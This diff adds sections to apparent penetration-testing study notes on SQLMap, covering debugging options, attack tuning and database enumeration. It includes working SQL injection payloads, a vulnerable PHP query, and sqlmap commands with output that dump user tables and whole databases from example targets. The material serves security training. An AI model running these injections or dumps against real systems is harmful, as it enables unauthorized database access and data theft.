@@ -54,6 +54,26 @@
     - [Custom HTTP Requests](#custom-http-requests)
   - [Handling SQLMap Errors](#handling-sqlmap-errors)
     - [Display Errors](#display-errors)
+    - [Store the Traffic](#store-the-traffic)
+    - [Verbose Output](#verbose-output)
+    - [Using Proxy](#using-proxy)
+  - [Attack Tuning](#attack-tuning)
+    - [Prefix/Suffix](#prefixsuffix)
+    - [Level/Risk](#levelrisk)
+  - [Advanced Attack Tuning](#advanced-attack-tuning)
+    - [Status Code](#status-code)
+    - [Titles](#titles)
+    - [Strings](#strings)
+    - [Text-only](#text-only)
+    - [Techniques](#techniques)
+    - [UNION SQLi Tuning](#union-sqli-tuning)
+  - [Database Enumeration](#database-enumeration-1)
+    - [SQLMap Data Exfiltration](#sqlmap-data-exfiltration)
+    - [Basic DB Data Enumeration](#basic-db-data-enumeration)
+    - [Table Enumeration](#table-enumeration)
+    - [Table/Row Enumeration](#tablerow-enumeration)
+    - [Conditional Enumeration](#conditional-enumeration)
+    - [Full DB Enumeration](#full-db-enumeration)
 
 ---
 
@@ -1146,3 +1166,399 @@ OFFLINE
 
 ### Display Errors
 
+Use ```--parse-errors``` to parse the DBMS errors and display them as part of the programm run. This will  automatically print the DBMS error, thus giving you clarity on what the issue may be so that you can properly fix it:
+
+```bash
+...SNIP...
+[16:09:20] [INFO] testing if GET parameter 'id' is dynamic
+[16:09:20] [INFO] GET parameter 'id' appears to be dynamic
+[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))"',),)((' at line 1'"
+[16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''YzDZJELylInm' at line 1'
+...SNIP...
+```
+
+### Store the Traffic
+
+The ```-t [FILE]``` option stores the whole traffic content to an output file. This file then contains all sent and received HTTP traffic, so you can manually investigate these requests to see where the issue is occuring:
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
+
+d41y@htb[/htb]$ cat /tmp/traffic.txt
+HTTP request [#1]:
+GET /?id=1 HTTP/1.1
+Host: www.example.com
+Cache-control: no-cache
+Accept-encoding: gzip,deflate
+Accept: */*
+User-agent: sqlmap/1.4.9 (http://sqlmap.org)
+Connection: close
+
+HTTP response [#1] (200 OK):
+Date: Thu, 24 Sep 2020 14:12:50 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 914
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://www.example.com:80/?id=1
+
+<!DOCTYPE html>
+<html lang="en">
+...SNIP...
+```
+
+### Verbose Output
+
+The ```-v``` option raises the verbosity level of the console output. ```-v 6```, for example, will directly print all errors and full HTTP request to the terminal so that you can follow along with everything SQLMap is doing in real-time:
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.9}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 16:17:40 /2020-09-24/
+
+[16:17:40] [DEBUG] cleaning up configuration parameters
+[16:17:40] [DEBUG] setting the HTTP timeout
+[16:17:40] [DEBUG] setting the HTTP User-Agent header
+[16:17:40] [DEBUG] creating HTTP requests opener object
+[16:17:40] [DEBUG] resolving hostname 'www.example.com'
+[16:17:40] [INFO] testing connection to the target URL
+[16:17:40] [TRAFFIC OUT] HTTP request [#1]:
+GET /?id=1 HTTP/1.1
+Host: www.example.com
+Cache-control: no-cache
+Accept-encoding: gzip,deflate
+Accept: */*
+User-agent: sqlmap/1.4.9 (http://sqlmap.org)
+Connection: close
+
+[16:17:40] [DEBUG] declared web page charset 'utf-8'
+[16:17:40] [TRAFFIC IN] HTTP response [#1] (200 OK):
+Date: Thu, 24 Sep 2020 14:17:40 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 914
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://www.example.com:80/?id=1
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <title>SQLMap Essentials - Case1</title>
+</head>
+
+<body>
+...SNIP...
+```
+
+### Using Proxy
+
+You can utilize ```--proxy=http://[IP:PORT]``` to redirect the whole traffic through a proxy. This will route all SQLMap traffic through Burp, so that you can later manually investigate all requests, repeat them, and utilize all features of Burp with these requests.
+
+## Attack Tuning
+
+### Prefix/Suffix
+
+There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run. You can use ```--prefix``` and/or ```--suffix```.
+
+```bash
+sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- "
+```
+
+So this:
+
+```php
+$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
+$result = mysqli_query($link, $query);
+```
+
+Will turn into:
+
+```sql
+SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- ')) LIMIT 0,1
+```
+
+### Level/Risk
+
+By default, SQLMap combines a predefined set of most common boundaries, along with the vectors having a high chance of success in case of a vulnerable target. To use bigger sets of boundaries and vectors you can use ```--level``` and ```--risk```.
+
+|   |   |
+| - | - |
+| **```--level```** (_1-5, default 1_) | extends both vectors and boundaries being used, based on their expectancy of success |
+| **```--risk```** (_1-3, default 1_) | extends the used vector set based on their risk of causing problems at the target side | 
+
+```bash
+d41y@htb[/htb]$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3
+
+...SNIP...
+[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+...SNIP...
+[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+...SNIP...
+[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[14:46:05] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+...SNIP...
+[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
+[14:46:06] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[14:46:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+...SNIP...
+```
+
+As for the number of payloads, by default, the number of payloads used for testing a single parameter goes up to 72, while in the most detailed case the number of payloads increases to 7,865.
+
+> [!NOTE]
+> As SQLMap is already tuned to check for the most common boundaries and vectors, regular users are advised not to touch these options because it will make the whole detection process considerably slower. Nevertheless, in special cases of SQLi vulns, where the usage of OR payloads is a must, you may have to raise the risk level yourself.<br>
+> This is because OR payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements are actively modifying the database content.
+
+## Advanced Attack Tuning
+
+### Status Code
+
+When dealing with a huge target response with a lot of dynamic content, subtle differences between TRUE and FALSE responses could be used for detection purposes. If the difference between TRUE and FALSE responses can be seen in the HTTP codes, the option ```--code``` could be used to fixate the detection of TRUE responses to a specific HTTP code (_e.g. ```--code=200```_).
+
+### Titles
+
+In the difference between responses can be seen by inspecting the HTTP page titles, the switch ```--titles``` could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag ```<title>```.
+
+### Strings
+
+In case of a specific string value appearing in TRUE responses, while absent in FALSE responses, the option ```--string``` could be used to fixate the detection based only on the appearance of that single value (_e.g. --string=success_).
+
+### Text-only
+
+When dealing with a lot of hidden content, such as certain HTML page behaviors tags, you can use the ```--text-only``` switch, which removes all the HTML tags, and bases the comparison only on the textual content.
+
+### Techniques
+
+In some special cases, you have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if you want to force the usage of a specific SQLi payload type, the option ```--technique``` can specify the SQLi technique to be used.
+
+### UNION SQLi Tuning
+
+In some cases, UNION SQLi payloads require extra user-provided information to work. If you can manually find the exact number of columns of the vulnerable SQL query, you can provide this number to SQLMap with the option ```--union-cols```. In case that the default "dummy" filling values used by SQLMap -NULL and random integer- are not compatible with values from results of the vulnerable SQL query, you can specify an alternative value instead (_e.g. ```--union-char='a'```_). 
+
+Furthermore, in case there is a requirement to use an appendix at the end of a UNION query in the form of the FROM TABLE, you can set it with the option ```--union-from```.
+
+## Database Enumeration
+
+Enumeration represents the central part of an SQLi attack, which is done right after the successful detection and confirmation of exploitability of the targeted SQLi vulnerability. It consists of lookup and retrieval of all the available information from the vulnerable database.
+
+### SQLMap Data Exfiltration
+
+For such purpose, SQLMap has predefined set of queries for all supported DBMSes, where each entry represents the SQL that must be run at the target to retrieve the desired content.
+
+MySQL DBMS ```queries.xml``` example:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <dbms value="MySQL">
+        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
+        <cast query="CAST(%s AS NCHAR)"/>
+        <length query="CHAR_LENGTH(%s)"/>
+        <isnull query="IFNULL(%s,' ')"/>
+...SNIP...
+        <banner query="VERSION()"/>
+        <current_user query="CURRENT_USER()"/>
+        <current_db query="DATABASE()"/>
+        <hostname query="@@HOSTNAME"/>
+        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
+        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
+        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
+        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
+        <users>
+            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
+            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
+        </users>
+    ...SNIP...
+```
+
+### Basic DB Data Enumeration
+
+After a successful detection of an SQLi vulnerability, you can begin the enumeration of basic details from the database, such as the hostname of the vulnerable target, current user's name, current database name, or password hashes. SQLMap will skip SQLi detection if it has been identified earlier and directly start the DBMS enumeration process.
+
+Enumeration usually start with:
+
+- Database version banner
+  - ```--banner```
+- Current user name
+  - ```--current-user```
+- Current database name
+  - ```--current-db```
+- Checking if the current user has DBA rights
+  - ```--is-dba```
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.9}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 13:30:57 /2020-09-17/
+
+[13:30:57] [INFO] resuming back-end DBMS 'mysql' 
+[13:30:57] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5134=5134
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- -
+---
+[13:30:57] [INFO] the back-end DBMS is MySQL
+[13:30:57] [INFO] fetching banner
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: MySQL >= 5.0
+banner: '5.1.41-3~bpo50+1'
+[13:30:58] [INFO] fetching current user
+current user: 'root@%'
+[13:30:58] [INFO] fetching current database
+current database: 'testdb'
+[13:30:58] [INFO] testing if current user is DBA
+[13:30:58] [INFO] fetching current user
+current user is DBA: True
+[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'
+
+[*] ending @ 13:30:58 /2020-09-17/
+```
+
+### Table Enumeration
+
+After finding the current database name, the retrieval of table names would be by using the ```--tables``` option and specifying the DB name with ```-D testdb```.
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
+
+...SNIP...
+[13:59:24] [INFO] fetching tables for database: 'testdb'
+Database: testdb
+[4 tables]
++---------------+
+| member        |
+| data          |
+| international |
+| users         |
++---------------+
+```
+
+After spotting the table name of interest, retrieval of its contents can be done by using the ```--dump``` option and specifying the table name with ```-T users```.
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
+
+...SNIP...
+Database: testdb
+
+Table: users
+[4 entries]
++----+--------+------------+
+| id | name   | surname    |
++----+--------+------------+
+| 1  | luther | blisset    |
+| 2  | fluffy | bunny      |
+| 3  | wu     | ming       |
+| 4  | NULL   | nameisnull |
++----+--------+------------+
+
+[14:07:18] [INFO] table 'testdb.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv'
+```
+
+### Table/Row Enumeration
+
+When dealing with large tables with many columns and/or rows, you can specify the columns with the ```-C``` option.
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
+
+...SNIP...
+Database: testdb
+
+Table: users
+[4 entries]
++--------+------------+
+| name   | surname    |
++--------+------------+
+| luther | blisset    |
+| fluffy | bunny      |
+| wu     | ming       |
+| NULL   | nameisnull |
++--------+------------+
+```
+
+To narrow down the rows based on their ordinal number(s) inside the table, you can specify the rows with the ```--start``` and ```--stop``` options.
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
+
+...SNIP...
+Database: testdb
+
+Table: users
+[2 entries]
++----+--------+---------+
+| id | name   | surname |
++----+--------+---------+
+| 2  | fluffy | bunny   |
+| 3  | wu     | ming    |
++----+--------+---------+
+```
+
+### Conditional Enumeration
+
+If there is a requirement to retrieve certain rows based on a known WHERE condition, you can use the option ```--where```.
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+
+...SNIP...
+Database: testdb
+
+Table: users
+[1 entry]
++----+--------+---------+
+| id | name   | surname |
++----+--------+---------+
+| 2  | fluffy | bunny   |
++----+--------+---------+
+```
+
+### Full DB Enumeration
+
+Instead of retrieving content per single-table basis, you can retrieve all tables inside the database of interest by skipping the usage of option ```-T``` altogether. By simply using the switch ```--dump``` without specifying a table with ``` -T```, all of the current database content will be retrieved. As for the ```--dump-all``` switch, all the content from all the databases will be retrieved.
+
+In such cases, a user is also advised to include the switch ```--exclude-sysdbs```, which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.
